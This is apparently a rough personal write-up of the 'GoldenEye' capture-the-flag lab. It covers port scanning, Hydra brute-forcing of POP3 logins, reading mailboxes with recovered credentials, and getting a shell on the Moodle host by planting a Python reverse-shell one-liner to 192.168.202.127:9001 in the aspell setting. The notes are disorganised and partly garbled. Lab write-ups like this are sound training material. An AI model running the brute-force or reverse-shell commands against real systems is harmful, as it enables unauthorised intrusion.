# GoldenEye

## Intro & Enumeration

```bash
┌──(ayachi㉿kali)-[~]
└─$ nmap -p- --min-rate 3000 -T4 10.66.179.67 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-25 15:55 CET
Warning: 10.66.179.67 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.66.179.67
Host is up (0.28s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
55006/tcp open  unknown
55007/tcp open  unknown

```

```bash
──(ayachi㉿kali)-[~]
└─$ nmap -p- --min-rate 3000 -T4 10.66.179.67 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-25 15:55 CET
Warning: 10.66.179.67 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.66.179.67
Host is up (0.28s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
55006/tcp open  unknown
55007/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 40.58 seconds
                                                                                
┌──(ayachi㉿kali)-[~]
└─$ nmap -sC -sV -p 25,80,55006,55007 10.66.179.67 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-25 15:57 CET
Nmap scan report for 10.66.179.67
Host is up (0.19s latency).

PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2018-04-24T03:22:34
|_Not valid after:  2028-04-21T03:22:34
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-title: GoldenEye Primary Admin Server
|_http-server-header: Apache/2.4.7 (Ubuntu)
55006/tcp open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) CAPA UIDL PIPELINING TOP RESP-CODES AUTH-RESP-CODE STLS USER
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.10 seconds
                                                                                
┌──(ayachi㉿kali)-[~]
└─$ nmap -sV -p 25,80,55006,55007 10.66.179.67 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-25 15:58 CET
Nmap scan report for 10.66.179.67
Host is up (0.33s latency).

PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/pop3 Dovecot pop3d
55007/tcp open  pop3     Dovecot pop3d

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.55 seconds
             
```

Open ports 

```bash
25/tcp    open  smtp     Postfix smtpd
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/pop3 Dovecot pop3d
55007/tcp open  pop3     Dovecot pop3d

```

After inspecting elements , I found [http://10.66.179.67/terminal.js](http://10.66.179.67/terminal.js)

heres what I found there:

Two users:

- Boris
- Natalya

encoded boris password is 

InvincibleHack3r

![image.png](image%201.png)

just by pasting it in notion it was decoded into this 

```bash
InvincibleHack3r
```

Natalyahas successfully decoded the password with this 

```bash

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
```

    

loggin in i found this 

Qualified GoldenEye Network Operator Supervisors:
Natalya
Boris

👉 **GoldenEye lesson:**

> When you see SMTP + POP3, think email accounts, not exploits.
> 

```bash
InvincibleHack3r
```

then i tryed to connect to pop3

```bash
nc 10.66.179.67 55007
```

- ✅ **Boris + InvincibleHack3r works on the WEB**
- ❌ **Natalya + InvincibleHack3r does NOT work on POP3**
- ❌ **Boris + InvincibleHack3r does NOT work on POP3**

created a file userList.txt that contains usernames natalya and boris

run hydra bruteforce 

 

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt pop3://10.66.179.67:55007

```

the second worked for me

```bash
hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f <IP> -s 55007 pop3
```

boris:secret1!

natalya:bird

![image.png](image%202.png)

```bash
┌──(ayachi㉿kali)-[~]
└─$ telnet 10.66.179.67 55007
Trying 10.66.179.67...
Connected to 10.66.179.67.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
use boris 
-ERR Unknown command.
user boris
+OK
pass secret1!
+OK Logged in.
list
+OK 3 messages:
1 544
2 373
3 921
.
1
-ERR Unknown command: 1
read 1
-ERR Unknown command: READ
stat
+OK 3 1838
RETR 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id D9E47454B1
	for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
RETE 2
-ERR Unknown command: RETE
RETE 2  
-ERR Unknown command: RETE
RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id C3F2B454B1
	for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

.

```

new user :  xenia

list

retr x

i also connected to natasha 

there is a janus who is a syndicate , not sure how significant of an ifo is this 

i found this nin plaint text in the second mail

username: xenia
password: RCP90rulez!

[severnaya-station.com/gnocertdir](http://severnaya-station.com/gnocertdir)

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

```bash
echo " @ip http://severnaya-station.com/gnocertdir/" > /etc/hosts
```

connect ad xenia 

another user found doak

[55007][pop3] host: 10.66.179.67   login: doak   password: goat

![image.png](image%203.png)

then i found this when connecting as doak in pop3

dr_doak:4England!

![image.png](image%204.png)

we conect with dr_doak to severnya-station/gnocertdir

find a file

wget it 

Running

```
exiftool
```

in this image, we can see Unusual Image Description.

```
eFdpbnRlcjE5OTV4IQ==
```

This looks like base64 encoded string

using cyberchef frombase64 we got 

```bash
xWinter1995x!
```

we connect as admin with those cred

i did a RS here with that 

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.202.127",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`

`nc -lvnp 9001`

the code you paste there excute when the aspell work 

![image.png](image%205.png)

then i looked for a place where i can run the aspell , I ended up here where i created a blog . from there add any text and  click in the last icon in the bar ‘abc) it excute the rs , in the meanwhile i ran a listener for the Rs 

![image.png](image%206.png)